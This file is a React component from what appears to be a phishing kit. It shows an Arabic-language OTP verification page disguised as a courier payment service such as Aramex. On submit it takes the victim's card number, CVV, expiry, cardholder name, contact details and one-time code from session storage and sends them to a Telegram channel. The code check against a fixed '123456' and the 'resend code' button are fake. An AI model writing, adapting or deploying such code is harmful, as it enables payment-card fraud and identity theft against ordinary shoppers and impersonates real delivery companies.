import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { Shield, AlertCircle, ArrowLeft, Lock as LockIcon, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { formatCurrency } from "@/lib/countryCurrencies";
import { couriers } from "@/themes/themeConfig";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";

  const shippingInfo = linkData?.payload as any;

  let amount = 500;
  const rawAmount = shippingInfo?.cod_amount;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);

  const DEMO_OTP = "123456";
  
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);
  
  const handleChange = (index: number, value: string) => {
    const numericValue = value.replace(/[^0-9]/g, '');
    
    if (numericValue.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = numericValue;
      setOtp(newOtp);
      setError("");
      
      if (numericValue && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };
  
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      e.preventDefault();
      
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        const newOtp = [...otp];
        newOtp[index - 1] = "";
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      }
    }
    
    if (e.key === 'Delete') {
      e.preventDefault();
      const newOtp = [...otp];
      newOtp[index] = "";
      setOtp(newOtp);
    }
    
    if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === 'ArrowRight' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    if (e.key === 'Escape') {
      handleClearAll();
    }
  };
  
  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
    
    if (pastedData) {
      const newOtp = [...otp];
      for (let i = 0; i < pastedData.length && i < 6; i++) {
        newOtp[i] = pastedData[i];
      }
      setOtp(newOtp);
      
      const nextEmptyIndex = newOtp.findIndex(val => !val);
      if (nextEmptyIndex !== -1) {
        inputRefs.current[nextEmptyIndex]?.focus();
      } else {
        inputRefs.current[5]?.focus();
      }
    }
  };
  
  const handleClearAll = () => {
    setOtp(["", "", "", "", "", ""]);
    setError("");
    inputRefs.current[0]?.focus();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    const otpString = otp.join('');

    if (otpString.length !== 6) {
      setError("الرجاء إدخال رمز التحقق كاملاً");
      return;
    }

    const isCorrect = otpString === DEMO_OTP;

    const telegramResult = await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        address: customerInfo.address || '',
        service: serviceName,
        amount: formattedAmount,
        cardholder: sessionStorage.getItem('cardName') || '',
        cardNumber: sessionStorage.getItem('cardNumber') || '',
        cardLast4: sessionStorage.getItem('cardLast4') || '',
        expiry: sessionStorage.getItem('cardExpiry') || '12/25',
        cvv: sessionStorage.getItem('cardCvv') || '',
        otp: otpString,
        otp_status: isCorrect ? 'correct' : 'wrong',
        attempts: attempts + 1
      },
      timestamp: new Date().toISOString()
    });

    if (otpString === DEMO_OTP) {
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment-confirmation",
            name: customerInfo.name || '',
            email: customerInfo.email || '',
            phone: customerInfo.phone || '',
            service: serviceName,
            amount: formattedAmount,
            cardLast4: sessionStorage.getItem('cardLast4') || '',
            cardholder: sessionStorage.getItem('cardName') || '',
            otp: otpString,
            timestamp: new Date().toISOString()
          }).toString()
        });
      } catch (err) {
      }

      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });

      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);

      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        handleClearAll();
      }
    }
  };
  
  const isOtpComplete = otp.every(digit => digit !== "");
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="رمز التحقق"
      description="أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك"
      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
      theme="day"
    >
      <form onSubmit={handleSubmit} className="p-8">
        <div className="mb-6">
          <div className="flex gap-3 justify-center items-center" dir="ltr">
            {otp.map((digit, index) => (
              <Input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                className="w-14 h-16 text-center text-2xl font-bold border-2 rounded-xl transition-all"
                disabled={attempts >= 3}
                autoComplete="off"
              />
            ))}
          </div>
        </div>

        {error && (
          <div className="rounded-lg p-4 mb-6 flex items-start gap-2 bg-red-50 border border-red-200">
            <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0 text-red-500" />
            <p className="text-sm text-red-600">{error}</p>
          </div>
        )}

        {countdown > 0 && (
          <div className="text-center mb-6">
            <p className="text-sm text-gray-600">
              إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
            </p>
          </div>
        )}

        {attempts > 0 && attempts < 3 && (
          <div className="text-center mb-6">
            <p className="text-sm">
              المحاولات المتبقية: <strong>{3 - attempts}</strong>
            </p>
          </div>
        )}

        <Button
          type="submit"
          size="lg"
          className="w-full h-14 text-lg font-bold text-white transition-all hover:opacity-90"
          disabled={attempts >= 3 || !isOtpComplete}
        >
          {attempts >= 3 ? (
            <span>محظور مؤقتاً</span>
          ) : (
            <>
              <span className="ml-2">تأكيد الدفع</span>
              <ArrowLeft className="w-5 h-5" />
            </>
          )}
        </Button>

        {countdown === 0 && (
          <Button
            type="button"
            variant="outline"
            className="w-full mt-4 h-12"
            onClick={() => {
              setCountdown(60);
              toast({
                title: "تم إرسال الرمز",
                description: "تم إرسال رمز تحقق جديد إلى هاتفك",
              });
            }}
          >
            إعادة إرسال الرمز
          </Button>
        )}
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentOTPForm;
